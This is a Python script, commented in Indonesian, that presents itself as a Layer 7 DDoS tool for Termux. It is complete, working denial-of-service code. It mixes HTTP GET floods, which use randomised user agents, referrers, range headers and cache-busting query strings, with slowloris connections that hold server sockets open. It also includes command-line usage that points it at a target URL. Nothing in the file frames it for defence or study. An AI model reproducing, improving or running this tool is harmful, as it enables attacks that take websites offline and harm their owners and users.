#!/usr/bin/env python3
# Raps_Seven_Flood.py - Layer 7 DDoS Tool untuk Termux
# Jangan pake buat iseng, hehe tau diri

import socket
import ssl
import random
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# Konfigurasi sophisticated
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0"
]

REFERRERS = [
    "https://google.com/", "https://bing.com/", "https://youtube.com/",
    "https://facebook.com/", "https://tiktok.com/", "https://instagram.com/"
]

class Layer7Assault:
    def __init__(self, target_url, threads=200, duration=60):
        self.target = target_url.rstrip('/')
        self.parsed = urllib.parse.urlparse(self.target)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or '/'
        self.threads = threads
        self.deadline = time.time() + duration
        self.attack_running = True

    def _craft_http2_like_packet(self):
        """Bikin request HTTP/1.1 yang brutal dengan keep-alive & byte range"""
        ua = random.choice(USER_AGENTS)
        ref = random.choice(REFERRERS)
        # Range byte buat bikin server parsing sibuk
        range_header = f"bytes={random.randint(0, 500)}-{random.randint(1000, 5000)}"
        request = (
            f"GET {self.path}?r={random.randint(1, 999999)} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Referer: {ref}\r\n"
            f"Range: {range_header}\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Pragma: no-cache\r\n"
            f"\r\n"
        )
        return request.encode()

    def _slowloris_attack(self):
        """Slowloris: kirim header per bagian biar timeout"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        try:
            sock.connect((self.host, 80 if self.parsed.scheme != 'https' else 443))
            if self.parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            while self.attack_running and time.time() < self.deadline:
                sock.send(f"X-Raps: {random.randint(1, 1000)}\r\n".encode())
                time.sleep(random.uniform(5, 10))
            sock.close()
        except:
            pass

    def _flood_worker(self):
        """Flood dengan multiple socket per thread"""
        while self.attack_running and time.time() < self.deadline:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.host, 80 if self.parsed.scheme != 'https' else 443))
                if self.parsed.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                # Kirim banyak request dalam satu koneksi (pipelining)
                for _ in range(5):
                    sock.send(self._craft_http2_like_packet())
                    time.sleep(0.01)
                sock.close()
            except:
                pass

    def start(self):
        print(f"[Raps] -> Memulai serangan layer 7 ke {self.host} dengan {self.threads} thread")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads // 2):
                executor.submit(self._flood_worker)
            for _ in range(self.threads // 2):
                executor.submit(self._slowloris_attack)
        while time.time() < self.deadline:
            time.sleep(1)
        self.attack_running = False
        print("[Raps] -> Serangan selesai, bos.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 4:
        print("Cara pakai: python raps_seven_flood.py <url> <thread> <detik>")
        print("Contoh: python raps_seven_flood.py https://target.com 500 30")
        sys.exit(1)
    url = sys.argv[1]
    threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    attack = Layer7Assault(url, threads, duration)
    attack.start()